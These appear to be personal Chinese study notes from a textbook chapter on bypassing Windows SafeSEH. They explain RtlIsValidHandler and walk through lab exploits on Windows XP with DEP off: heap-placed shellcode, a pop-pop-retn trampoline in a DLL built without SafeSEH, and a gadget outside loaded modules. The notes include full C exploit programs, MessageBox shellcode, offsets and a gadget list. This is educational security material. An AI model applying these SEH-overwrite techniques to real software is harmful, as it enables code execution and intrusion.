![image-20220711092903920](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711092903920.png)

  （3）在前面两项检查都通过后，程序调用一个全新的函数 RtlIsValidHandler()，来对异常处 理函数的有效性进行验证，稍后我们会详细介绍 RtlIsValidHandler()函数。

 	作为一个全新的安全校验函数，RtlIsValidHandler 都做了哪些工作呢？Alex 在 2008 年的 Black Hat 大会上对其进行了披露。 

​	首先，该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的 内存空间，校验函数将依次进行如下校验：

​	（1）判断程序是否设置了 IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了 这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。 

​	（2）检测程序是否包含安全 S.E.H 表。如果程序包含安全 S.E.H 表，则将当前的异常处理 函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。 

​	（3）判断程序是否设置 ILonly 标识。如果设置了这个标识，说明该程序只包含.NET 编译 人中间语言，函数直接返回校验失败。 

​	（4）判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。

​		如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行 DEP 相 关检测，函数依次进行如下校验：

​	（1）判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函 数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校 验成功，否则程序抛出访问违例的异常。 

（2）判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否 则返回校验失败。

​	RtlIsValidHandler()函数的校验流程如图 11.1.4 所示。

![image-20220711094647538](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711094647538.png)

RtlIsValidHandler()函数的伪代码如下所示：

```
BOOL RtlIsValidHandler(handler) 
{ 
 if (handler is in an image) { //在加载模块内存空间内
 if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set) 
 return FALSE; 
 if (image has a SafeSEH table) //含有安全 S.E.H 表，说明程序启用 SafeSEH
 if (handler found in the table)//异常处理函数地址出现在安全 S.E.H 表中
 return TRUE; 
 else //异常处理函数未出现在安全 S.E.H 表中
 return FALSE; 
 if (image is a .NET assembly with the ILonly flag set) //只包含 IL 
 return FALSE; 
 } 
 if (handler is on a non-executable page) { //跑到不可执行页上了
 if (ExecuteDispatchEnable bit set in the process flags) //DEP 关闭
 return TRUE; 
 else 
 raise ACCESS_VIOLATION; //抛出访问违例异常
 } 
 if (handler is not in an image) { //在加载模块内存之外，并且在可执行页上
 if (ImageDispatchEnable bit set in the process flags) 
 //允许在加载模块内存空间外执行
 return TRUE; 
 else 
 return FALSE; 
 } 
 return TRUE; //前面条件都不满足的话只能允许这个异常处理函数执行了
}
```

​		通过以上分析，可以看到 SafeSEH 对 S.E.H 的校验已经相当完善了，并且能够有效降低通 过攻击 S.E.H 中异常处理函数指针而获得控制权的可能性。现在您应该明白在 6.1 中我们为什 么总是建议在 Windows 2000 平台上进行实验了吧。 但 SafeSEH是否真的可以杜绝针对S.E.H的攻击呢？

 	RtlIsValidHandler()函数 会在哪些情况下的允许异常处理函数执行。

（1）异常处理函数位于加载模块内存范围之外，DEP 关闭。 

（2）异常处理函数位于加载模块内存范围之内，相应模块未启用 SafeSEH（安全 S.E.H 表 为空），同时相应模块不是纯 IL。 

（3）异常处理函数位于加载模块内存范围之内，相应模块启用 SafeSEH（安全 S.E.H 表不 为空），异常处理函数地址包含在安全 S.E.H 表中。

​		我们来分析一下这三种情况的可行性。 

​	（1）现在我们只考虑 SafeSEH，不考虑 DEP，针对 DEP 的讨论我们放到下一节中。排除 DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入 shellcode 执行， 这点还是比较容易实现的。 

​	（2）在第二种情况中，我们可以利用未启用 SafeSEH 模块中的指令作为跳板，转入 shellcode 执行，这也是为什么我们说 SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一 个未启用的 SafeSEH 模块也不是一件很困难的事情。 

​	（3）这种情况下我们有两种思路可以考虑，一是清空安全 S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全 S.E.H 表中。由于安全 S.E.H 表的信息在内存 中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。

​		通过以上分析可以得出结论：突破 SafeSEH 还是可以做到的。您可能会问这些方法貌似有点复杂，有没有更为简便的方法突破呢？很负责地告诉您，方法是有的。有两种更为简便直接方法可以突破 SafeSEH。

（1）不攻击 S.E.H，可以考虑覆盖返回地址或者虚函数表等信息。 

（2）利用 S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果 S.E.H 中的异常 函数指针指向堆区，即使安全校验发现了 S.E.H 已经不可信，仍然会调用其已被修改过的异常 处理函数，因此只要将 shellcode 布置到堆区就可以直接跳转执行！

 理论分析结束，接下来我们转入实战阶段。请注意本节所有关于绕过 SafeSEH 机制的讨论 均不考虑 DEP 的影响

## 11.2 攻击返回地址绕过 SafeSEH 

​		 如果碰到一个程序，他启用了 SafeSEH 但是未启用 GS，或者启用了 GS 但是刚好被攻击 的函数没有 GS 保护（我们不考虑这种事情发生的概率，而且这种漏洞的的确确存在），攻击者 肯定会直接攻击函数返回地址。在这里我们不过多介绍了。

##  11.3 利用虚函数绕过 SafeSEH  

​		利用思路和我们在 10.3 中介绍的类似，通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理，SafeSEH 也就只是个摆设。大家可以参考一下 10.3 中的例子自己实践一下， 在这我们就不做过多介绍了

## 11.4 从堆中绕过 SafeSEH 

|           | 推荐使用的环境 | 备注    |
| --------- | -------------- | ------- |
| 操作系统  | windowXP SP3   | DEP关闭 |
| 编译器    | VS2008         |         |
| 编译选项  | 禁用优化选项   |         |
| build版本 | release版本    |         |



代码

```
#include<stdafx.h> 
#include<stdlib.h> 
#include<string.h> 
char shellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"……" 
"\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xA0\x29\x39\x00"//address of shellcode in heap 
; 
void test(char * input) 
{ 
 char str[200]; 
 strcpy(str,input); 
 int zero=0; 
 zero=1/zero; 
} 
void main() 
{ 
 char * buf=(char *)malloc(500); 
 __asmint 3 
 strcpy(buf,shellcode); 
 test(shellcode); 
}
```

对实验思路和代码简要解释如下。 

（1）首先在堆中申请 500 字节的空间，用来存放 shellcode。 

（2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖程 序的 S.E.H 信息。

 （3）用 shellcode 在堆中的起始地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程 序转入异常处理，进而跳转到堆中的 shellcode 执行。

​		由于本次实验利用的是 SafeSEH 对堆的特殊处理，所以大家尽可以将本次实验看做是普通 的 S.E.H 攻击，只是 shellcode 没有放在栈中而是放在堆中的。我们首先将 shellcode 填充为多个 0x90，然后将程序用 VS2008 编译好后运行，由于我们在程序里加入了 int 3 指令，程序会 自动中断，我们选择调试后系统会调用默认调试器进行调试。大家可以按照前面说过的方法将 OllyDbg 设置为默认调试器。OllyDbg 附件到程序后会停在__asm int 3 处。

![image-20220711101414643](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711101414643.png)

​		如上图 ，程序中断前刚刚完成堆中空间的申请，此时寄存器 EAX 中存放着申请空间的首地址，所以 0x003A3DA0 也就是 shellcode 的首地址，这个地址可能在您的机器上会有所不同，请自行调试确定。有了 shellcode 的首地址后我们还需要确定填充多少个字节才能淹没 异常函数的地址。我们让程序继续运行，中断在 test 函数中字符串复制结束时。

![image-20220711102649147](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711102649147.png)

​		如上图 ，被溢出的字符串起始位置为 0x0012FE8C，S.E.H 异常处理函数指针位于 0x0012FFB0+4 的位置，这两个地址在您的调试环境中可能会有所改变，请根据环境自行调整。 所以我们使用 300 个字节就可以覆盖掉异常处理函数指针。所有的信息都收集好了，接下来我 们开始布置 shellcode。

​	我们将弹出“failwest”对话框的机器码代码放到最前面，然后是 128 个字节的 0x90 填充，最后在第 296~300 字节位置放上 shellcode 在堆中的起始地址 0x003A3DA0，用来更改异常处理函数的指针。shellcode 布局如下图11.4.3 所示。

![image-20220711102912860](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711102912860.png)

​		接下来验证一下我们的分析是否正确，用设计好的 shellcode 替换测试用的 0x90 串，重新 编译运行程序。程序依然会被 INT 3 中断，等 OllyDbg **运行后**在 0x003A3DA0 上设置断点，然后按 F9 键让程序继续运行，可以看到程序在 0x003A3DA0 处中断，说明我们现在已经成功绕过 SafeSEH 转入 shellcode 执行了，如图 11.4.4 所示。

![image-20220711104613762](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711104613762.png)

让程序继续运行就会看到熟悉的对话框弹了。

![image-20220711104624414](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711104624414.png)

## 11.5 利用未启用 SafeSEH 模块绕过 SafeSEH 

​		 SafeSEH 对于发生在未启用 SafeSEH 模块中的异常处理的校验过程。如果模块未启用 SafeSEH，并且该模块不是仅包含中间语言（IL），这个异常处理就可以被执行。 所以如果我们能够在加载的模块中找到一个未启用 SafeSEH 的模块，就可以利用它里面的指令作为跳板来绕过 SafeSEH。 

​		本次实验我们将构建一个不启用 SafeSEH 的 dll，然后将其加载，并通过它里面的指令作 为跳板实现 SafeSEH 的绕过。我们通过以下代码来演示和分析一下如何未启用 SafeSEH 的模 块来绕过 SafeSEH 机制。

```

//SEH_NOSafeSEH.EXE 
#include <stdio.h>
#include <tchar.h>
#include<stdlib.h> 
#include<string.h> 
#include<windows.h> 
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x68\x10\x12\x11"//address of pop pop retn in No_SafeSEH module 
"\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8" 
; 
DWORD MyException(void) 
{ 
 printf("There is an exception"); 
 getchar(); 
 return 1; 
} 
void test(char * input) 
{ 
 char str[200]; 
 strcpy(str,input); 
 //__asm int 3
int zero=0; 
 __try 
 { 
 zero=1/zero; 
 } 
 __except(MyException()) 
 { 
 } 
} 
int _tmain(int argc, _TCHAR* argv[]) 
{ 
 		HINSTANCE hInst = LoadLibrary(_T("SEH_NOSafeSEH_JUMP.dll"));//load  No_SafeSEH module
        //HINSTANCE 是“句柄型”数据类型。相当于装入到了内存的资源的ID。HINSTANCE对应的资源是instance.句柄实际上是一个 无符号长整数。但它是“句柄型”，所以你不能把它当成真的无符号长整数，拿来派别的用处，例如，不能拿来做四则运算。HINSTANCE常出现在 API 程序：
	 char str[200]; 
 	//__asm int 3 
 	test(shellcode); 
	 return 0; 
} 
```

对实验思路和代码简要解释如下。 

（1）用 VC++ 6 .0 编译一个不使用 SafeSEH 的动态链接库 SEH_NOSafeSEH_JUMP.DLL， 然后由启用 SafeSEH 的应用程序 SEH_NOSafeSEH.EXE 去加载它。 

（2）SEH_NOSafeSEH 中的 test 函数存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。 

（3）使用 SEH_NOSafeSEH_JUMP.DLL 中的“pop pop retn”指令地址覆盖异常处理函数地 址，然后通过制造除 0 异常，将程序转入异常处理。通过劫持异常处理流程，程序转入 SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn”指令，**在执行 retn 后程序转入shellcode 执行。**

 实验环境:

|           | 推荐环境      | 备注                      |
| --------- | ------------- | ------------------------- |
| 操作系统  | WindowsXP SP3 | DEP关闭                   |
| EXE编译器 | VS2008        |                           |
| DLL编译器 | C++  6.0      | 将dll基址设置为0x11120000 |
| 编译选项  | 禁用优化选项  |                           |
| build版本 | release版本   |                           |

使用 VC++ 6.0 建立一个 Win32 的动态链接库（不是 MFC 版的），如下图 所示。

![image-20220711142101492](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711142101492.png)

​		由于 VC++ 6.0 编译的 DLL 默认加载基址为 0x10000000，如果以它作为 DLL 的加载基址， DLL 中“pop pop ret n”指令地址中可能会包含 0x00，这会在我们进行 strcpy 操作时会将字符串截断影响我们 shellcode 的复制，所以为了方便测试我们需要对基址进行重新设置。在顶部菜 单中选择“工程→设置”，然后切换到“连接”选项卡，在“工程选项”的输入框中添加 /base:"0x11120000"  即可，如下图

![image-20220711142638635](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711142638635.png)

​	编译好后将 SEH_NOSafeSEH_JUMP.DLL 复制到 SEH_NOSafeSEH.EXE 目录下即可。

```
//SEH_NOSafeSEH_JUMP.DLL 
#include"stdafx.h" 
BOOL APIENTRY DllMain( HANDLE hModule,DWORD ul_reason_for_call, LPVOID 
lpReserved) 
{ 
return TRUE; 
} 
void jump() 
{ 
__asm{ 
 pop eax 
 pop eax 
 retn 
 } 
} 
```

​	搞定不启用 SafeSEH 的 DLL 后我们回过头来分析要溢出的主程序，我们依然采用添加 INT  3 的方式中断程序，然后通过 OllySSEH 插件来查看加载模块的 SafeSEH 情况。可以在 (https://bbs.pediy.com/thread-45544.htm)处下载到 OllySSEH 。 OllySSEH 对于 SafeSEH 的描述有四种：

（1）/SafeSEH OFF，未启用 SafeSEH，这种模块可以作为跳板。 

（2）/SafeSEH ON，启用 SafeSEH，可以使用右键点击查看 S.E.H 注册情况。

（3）No SEH，不支持 SafeSEH，即 IMAGE_DLLCHARACTERISTICS_ NO_SEH 标志位被 设置，模块内的异常会被忽略，所以不能作为跳板。 

（4）Error，读取错误。

​		如下图 ，虽然主程序 SEH_NOSafeSEH.EXE 启用了 SafeSEH，但是它里面的模块 SEH_NOSafeSEH_JUMP.DLL 未启用 SafeSEH，我们可以利用这个 DLL 中的指令作为跳板来绕 过 SafeSEH。现在我们需要在这个 DLL 中找到一个合适的跳板指令，接下来我们转入 SEH_NOSafeSEH_JUMP.DLL 的空间去寻找可以使用的“pop pop retn”指令序列。

![image-20220711150412899](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711150412899.png)

​		如下图 ，我们在 DLL 中添加的“pop ea x pop ea x ret n”指令序列起始地址为 **0x11121068**，当然您也可以在这个 DLL 寻找其他的“pop po p retn”指令序列，在本次实验中 我们将使用 0x11121068 为跳板地址。

![image-20220711150933715](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711150933715.png)

​		确定好跳板地址后，我们来计算被溢出字符串到最近的异常处理函数指针的距离，我们依 然将字符串 shellcode 赋值为 0x90 串，长度小于 200 个字节，然后在 strcpy 操作结束后中断程 序。如图 11.5.5 所示，被溢出字符串的起始位置为 **0x0012FDB8**，距离它最近的异常处理函数 指针位于 **0x0012FE90+4** 的位置，所以当字符串长度超过 224 个字节后就可以覆盖异常处理函 数指针。

![image-20220711152642185](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711152642185.png)

​		由于这次使用的是“pop pop retn”指令序列，所以我们要将弹出“failwest”对话框的机器码放到 shellcode 的后半部分。这就有一个细节我们需要注意了，经过 VS 2008 编译的程序，在 进入含有__try{}的函数时会在 Security Cookie+4 的位置压入−2（VC++ 6.0 下为−1），在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。例如，函数中有两 个__try{}块，在进入第一个__try{}块时这个值会被修改成 0，进入第二个的时候被修改为 1。 如果在__try{}块中出现了异常，程序会根据这个值调用相应的__except()处理，处理结束后这 个位置的值会重新修改为−2；如里没有发生异常，程序在离开__try{}块时这个值也会被修改回 −2。当然这个值在异常处理时还有其他用途，在这我们不过多介绍，有兴趣的话可以自己跟踪 调试一下。我们只需要知道由于它的存在，我们的 shellcode 可能会被破坏。

![image-20220711154448139](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711154448139.png)

​		为了避免shellcode 关键部分被破坏，我们采用一下布局：shellcode 最开始部分为 220 个字节的 0x90 填充；在 221~224 位置用跳板地址 0x11121068 覆盖；**然后再跟上 8 个字节的 0x90 填充；**最后附上弹出 “ failwest” 对话框的机器码。这样就可以保证弹出对话框的机器码不被破坏了。

![image-20220711154140295](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711154140295.png)

​	在程序里按照上边的布局将 shellcode 布置好后，将程序重新编译运行，等待 OllyDbg 启动后，我们在0x11121068 处下好断点，然后让程序继续运行。不出意外的话可以看到程序在0x11121068 处中断，说明现在我们已经绕过 SafeSEH 成功劫持程序流程了，如下图 

![image-20220711155455137](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711155455137.png)

再按 F9 键让程序继续执行，就能看到熟悉的对话框了，如图 

![image-20220711155633739](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711155633739.png)

## 11.6 利用加载模块之外的地址绕过 SafeSEH

​		当程序加载到内存中后，在它所占的整个内存空间中，除了我们平时常见的 PE 文件模块 （EXE 和 DLL）外，还有其他一些映射文件，我们可以通过 OllyDbg 的“view→memory”查看 程序的内存映射状态。

​		例如，在下图中，类型为 Map 的映射文件，SafeSEH 是无视它们的， 当异常处理函数指针指向这些地址范围内时，是不对其进行有效性验证的，所以如果我们可以 在这些文件中找到跳转指令的话就可以绕过 SafeSEH，而这样的指令也确实存在。

![image-20220711215144560](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711215144560.png)

​	经过前辈们的不懈努力找到了一批可以用在这种情况下的跳板地址。除了我们前面用过的 “pop pop retn”指令序列外，还有如下指令：

```
call/jmpdword ptr[esp+0x8] 
call/jmpdword ptr[esp+0x14] 
call/jmpdword ptr[esp+0x1c] 
call/jmpdword ptr[esp+0x2c] 
call/jmpdword ptr[esp+0x44] 
call/jmpdword ptr[esp+0x50] 
call/jmp dword ptr[ebp+0xc] 
call/jmp dword ptr[ebp+0x24] 
call/jmp dword ptr[ebp+0x30] 
call/jmp dword ptr[ebp-0x4] 
call/jmp dword ptr[ebp-0xc] 
call/jmp dword ptr[ebp-0x18]
```

​		只我们找到其中一条指令就可以绕过 SafeSEH 了，我们通过以下代码来演示和分析如何在 所有加载模块都开启 SafeSEH 机制的情况下绕过 SafeSEH。

```
#include"stdafx.h" 
#include<string.h> 
#include<windows.h> 
char shellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"……" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"// far jump and \x90 
"\xEB\xF6\x90\x90"// short jump and \x90 
"\x0B\x0B\x29\x00"// address of call [ebp+30] in outside memory 
; 
DWORD MyException(void) 
    { 
     printf("There is an exception"); 
     getchar(); 
     return 1; 
    } 
void test(char * input) 
    { 
         char str[200]; 
         strcpy(str,input); 
         int zero=0; 
     __try 
         { 
         zero=1/zero; 
         } 
     __except(MyException()) 
         {
         } 
    } 
int _tmain(int argc, _TCHAR* argv[]) 
    { 
             //__asm int 3 
             test(shellcode); 
             return 0; 
    }
```

​	对实验思路和代码简要解释如下。 

（1）Test 函数中存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖 程序的 S.E.H 信息。 

（2）该程序中所有加载模块都启用了 SafeSEH 机制，故我们不能通过未启用 SafeSEH 的 模块还绕过 SafeSEH 了。 

（3）将异常处理函数指针覆盖为加载模块外的地址来实现对 SafeSEH 的绕过，然后通过除 0 触发异常将程序转入异常处理，进而劫持程序流程。

|           | 推荐环境      | 备注                      |
| --------- | ------------- | ------------------------- |
| 操作系统  | WindowsXP SP3 | DEP关闭                   |
| EXE编译器 | VS2008        |                           |
| DLL编译器 | C++  6.0      | 将dll基址设置为0x11120000 |
| 编译选项  | 禁用优化选项  |                           |
| build版本 | release版本   |                           |

​		我们首先用 0x90 填充 shellcode，长度不超过 200 个字节，然后编译运行程序。由于__asm  INT 3 的存在程序会被中断，等 Ollydbg 启动好后我们通过 OllySSEH 插件来查看当前加载模块 的 SafeSEH 情况。 

​		如下图所示，所有的加载模块都不是/SafeSEH OFF 状态，也就是意味着我们不能利用 任何一个模块进行跳转绕过 SafeSEH 了，所以我们只能在加载模块内存范围之外的地方寻找合 适的跳板绕过 SafeSEH 了，只要能找到前面提到指令中的任意一条我们就成功了一半。

![image-20220711221721833](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711221721833.png)

1. 接下来需要使用 OllyFindAddr 插件，它能在整个程序的内存空间搜索指令。OllyFindAddr下载地址：https://bbs.pediy.com/thread-198080.htm

   ​	与 Ollydbg 自己的指令搜索不同，OllyFindAddr 不只在加载模块中搜索指令，而是在整个程序的 内存空间搜索。本次实验中我们将使用 call/jmp dword ptr[ebp+n]指令来作为跳板。

2. 使用 call/jmp dword ptr[ebp+n]指令作为跳板。插件 —> OllyFindAddr —> Overflow return address —> Find CALL/JMP [EBP+N]

   ![image-20220711222434492](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711222434492.png)

   ​	

   ​		搜索结束后可以在日志窗口（菜單查看中）中查看搜索结果。如下图 所示，虽然我们找到很多符合搜 索特征的指令，但是绝大多数的都是位于加载模块中，这样的指令都是不能用来作为跳板的。 在 0x00290B0B 处找到了一条 call [ ebp+0x30]的指令，与OllyDbg 中的内存窗口对比可以发现这个地址不位于任何加载模块中，所以这个地址可以作为 我们的跳板。

![image-20220711223526014](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711223526014.png)



​		如果使用 0x00290B0B 作为跳板，我们还面临一个比较棘手的问题，这个地址中包含着 0x00，这就意味着在字符串复制的时候 0x00 之后的内容都会被截断，所以我们不能将 shellcode 的关键部分放到跳板后边（如果是 Unicode 的漏洞就不用考虑这个问题，因为 Unicode 的结束 符号为 0x0000）

​			我们在利用未启用 SafeSEH 模块绕过 SafeSEH 最后提到得的 0xEB0E9090 ，其实 0xEB0E 是**向前跳转 0x0E 的机器码**。通过对图 11.5.9 分析我们可以知道通过跳板指令转入 shellcode 后首先是 4 个字节的 0x90 的填充，而短跳转指令只需要 2 个字节，因此我们 可以在这个 4 个字节的位置放置一个短跳转指令让程序向内存低址位置跳转。**但由于 1 个字节 的操作数向回跳的范围有限，不足以跳转到 shellcode 的起始地址**，所以我们利用两次跳转来完成跳跃

​	（1）通过一个 2 字节的短跳转指令 0xEBF6（ F6为-8的补码） 向回跳 8 个字节。 

​	（2）在这 8 个字节中我们再布置一条 5 字节的长跳转指令完成最终的回跳。

![image-20220713150627586](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713150627586.png)

跳转示意如图 11.6.5 所示。

![image-20220713150846731](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713150846731.png)

​		目前为止我们已经确定了跳板地址和短跳转指令机器码，只要再确定 shellcode 起始地址到长跳转指令之间的距离就可以对 shellcode 进行布置了。在这大家可能会有一个疑问为什么在短跳转指令中我们是向回跳了 10 个字节而不是 8 个字节？**这是因为 JMP 指令在采用相对地址跳转的时候是以 JMP 下一条指令的地址为基准的**，所以我们在回跳的时候还要将短跳转指令的 2 个字节计算进去。

​		接下来在完成 test 函数中 strcpy 操作后中断程序，如上两图字符串起始位置为0x0012FE88，距离最近的SEH地址为 0x0012ff60+4，

所以跳板位置放在0x0012ff64

短跳位置放在0012ff60（回跳8字节）  使用

长跳位置放在0012FF58（回调到shellcode 的起始地址 要跳转208+5个字节  包含长跳转指令的5个字节） 使用E92BFFFFFF（跳转 0xFFFFFF2B 个字节）填充长跳位置。

*FFFFFF2B  回跳 是  -213 的补码*

![0](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713154255975.png)

![image-20220713154410532](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713154410532.png)

![image-20220713161132326](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713161132326.png)

​		部署 shellcode 如下：在 shellcode 开始部分为弹出 “failwest”对话框的机器码，然后是 0x90 填充，接着为长跳转指令，再跟着 0x90 填充，最后 为短跳转指令和跳板指令，整个布局如图 11.6.7 所示。

![image-20220713165132556](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713165132556.png)

运行结果

![image-20220713171105260](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713171105260.png)

## 11.7 利用Adobe Flash Player ActiveX控件绕过SafeSEH

​		其实这种方法就是利用未启用 SafeSEH 模块绕过 SafeSEH 的浏览器版。Flash Player  ActiveX 在 9.2.124 之前的版本不支持 SafeSEH，所以如果我们能够在这个控件中找到合适的跳 板地址，就完全可以绕过 SafeSEH。

​		Flash Player  ActiveX 在 9.2.124 之前的版本不支持 SafeSEH，所以如果我们能够在这个控件中找到合适的跳 板地址，就完全可以绕过 SafeSEH。

​		 利用浏览器演示如何利用 Adobe Flash Player ActiveX 控件（下载地址：https://bbs.pediy.com/thread-148893.htm）绕过 SafeSEH 需要三方面的支持： 

（1）具有溢出漏洞的 ActiveX 控件。 

（2）未启用 SafeSEH 的 Flash Player ActiveX 控件。 

（3）可以触发 ActiveX 控件中溢出漏洞的 POC 页面。*{PoC（全称: Proof of Concept）, 中文译作概念验证。在安全界，你可以理解成为**漏洞验证程序**。和一些应用程序相比，PoC 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。}*

​		首先，我们使用 Visual Studio 2008 建立一个基于 MFC 的 ActiveX 控件，如下图

![image-20220713181259285](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713181259285.png)

